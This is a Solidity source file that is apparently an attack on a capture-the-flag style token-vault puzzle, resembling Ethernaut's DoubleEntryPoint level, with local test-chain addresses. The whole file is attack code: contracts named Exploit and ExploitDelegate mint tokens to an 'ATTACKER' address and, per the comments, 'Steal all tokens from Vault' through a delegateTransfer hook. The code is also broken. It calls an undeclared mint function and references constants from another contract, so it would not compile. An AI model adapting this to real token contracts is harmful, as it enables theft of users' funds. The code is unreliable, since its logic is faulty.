pragma solidity ^0.8.0;

interface IDelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IForta {
    function setDetectionBot(address) external;
}

interface IToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {

    address public constant DET_ADDRESS = 0x10C6E9530F1C1af873a391030a1D9E8ed0630D26; // 0x10C6E9530F1C1AF873a391030a1D9E8ed0630D26
    address public constant VAULT_ADDRESS = 0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883;
    address public constant ATTACKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    address public constant LEGACY_TOKEN = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address public constant FORTA = 0x5FbDB2315678afecb367f032d93F642f64180aa3;

    function executeExploit() external {
        // 1. Mint tokens to player from LegacyToken
        IToken(LEGACY_TOKEN).mint(ATTACKER, 1000000000000000000000);

        // 2. Transfer tokens via LegacyToken to trigger delegateTransfer
        IToken(LEGACY_TOKEN).transfer(VAULT_ADDRESS, 1000000000000000000000);
    }
}

contract ExploitDelegate is IDelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool) {
        // Steal all tokens from Vault
        IToken(DET_ADDRESS).transfer(ATTACKER, IToken(DET_ADDRESS).balanceOf(VAULT_ADDRESS));
        return true;
    }
}